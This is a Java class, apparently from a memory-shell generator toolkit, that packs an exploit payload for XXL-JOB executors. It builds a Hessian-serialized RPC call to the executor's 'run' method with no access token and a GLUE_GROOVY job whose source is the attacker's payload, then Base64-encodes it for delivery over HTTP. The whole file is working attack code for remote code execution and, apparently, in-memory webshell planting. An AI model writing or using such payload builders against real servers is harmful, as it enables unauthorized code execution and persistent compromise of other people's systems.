package org.leo.jmg.mem.packer.xxljob;

import com.caucho.hessian.io.Hessian2Output;
import com.xxl.job.core.biz.model.TriggerParam;
import com.xxl.rpc.remoting.net.params.XxlRpcRequest;
import org.leo.jmg.mem.packer.ClassPackerConfig;
import org.leo.jmg.mem.packer.Packer;
import org.leo.jmg.mem.packer.PackerMeta;

import java.io.ByteArrayOutputStream;
import java.util.Base64;
import java.util.UUID;

@PackerMeta(name = "XxlJobHessian", group = "XXL-JOB", order = 2,
        minTargetJava = 8, supportedProtocols = {"http"})
public class XxlJobHessianPacker implements Packer {
    @Override
    public String pack(ClassPackerConfig config) throws Exception {
        long now = System.currentTimeMillis();
        TriggerParam trigger = new TriggerParam();
        trigger.setJobId(1);
        trigger.setExecutorHandler("demoJobHandler");
        trigger.setExecutorParams("demoJobHandler");
        trigger.setExecutorBlockStrategy("COVER_EARLY");
        trigger.setExecutorTimeout(0);
        trigger.setLogId(1);
        trigger.setLogDateTime(now);
        trigger.setGlueType("GLUE_GROOVY");
        trigger.setGlueSource(XxlJobPayloadSupport.source(config));
        trigger.setGlueUpdatetime(now);
        trigger.setBroadcastIndex(0);
        trigger.setBroadcastTotal(0);

        XxlRpcRequest request = new XxlRpcRequest();
        request.setRequestId(UUID.randomUUID().toString());
        request.setCreateMillisTime(now);
        request.setAccessToken(null);
        request.setClassName("com.xxl.job.core.biz.ExecutorBiz");
        request.setMethodName("run");
        request.setParameterTypes(new Class<?>[]{TriggerParam.class});
        request.setParameters(new Object[]{trigger});

        ByteArrayOutputStream output = new ByteArrayOutputStream();
        Hessian2Output hessian = new Hessian2Output(output);
        hessian.writeObject(request);
        hessian.flush();
        return Base64.getEncoder().encodeToString(output.toByteArray());
    }
}
